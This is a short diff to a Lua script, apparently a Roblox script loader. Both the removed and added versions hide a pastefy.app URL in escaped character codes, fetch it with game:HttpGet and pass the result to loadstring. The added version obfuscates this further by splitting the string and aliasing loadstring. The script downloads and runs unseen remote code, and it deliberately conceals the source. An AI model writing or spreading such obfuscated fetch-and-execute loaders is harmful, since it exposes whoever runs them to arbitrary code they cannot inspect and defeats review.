@@ -1,3 +1,4 @@
--- ASCII Obfuscation Level [1/2] Difficulty [Hard]
-local ASCII_Obfuscation_Level_1_2_Difficulty_Hard = "\104\x74\x74\x70\x3a\x2f\x2f\x70\x61\x73\x74\x65\x66\x79\x2e\x61\x70\x70\x2f\x49\x33\x4c\x31\x75\x6f\x51\x67\x2f\x72\x61\x77"
-loadstring(game:HttpGet(ASCII_Obfuscation_Level_1_2_Difficulty_Hard))();
+-- ASCII Obfuscation Level [1/2] Difficulty [Hard] [You Might Be Wondering Why Am i Typing This Well This is Just For Fun]
+l_o = "\104\x74\x74\x70\x3a" .. "\x2f\x2f" .. "\x70\x61\x73\x74\x65\x66\x79\x2e\x61\x70\x70" .. "\x2f\x49\x33\x4c\x31\x75\x6f\x51\x67\x2f\x72\x61\x77"
+l_s = loadstring
+l_s((function (l_o) return l_o end)(game:HttpGet(l_o)))()
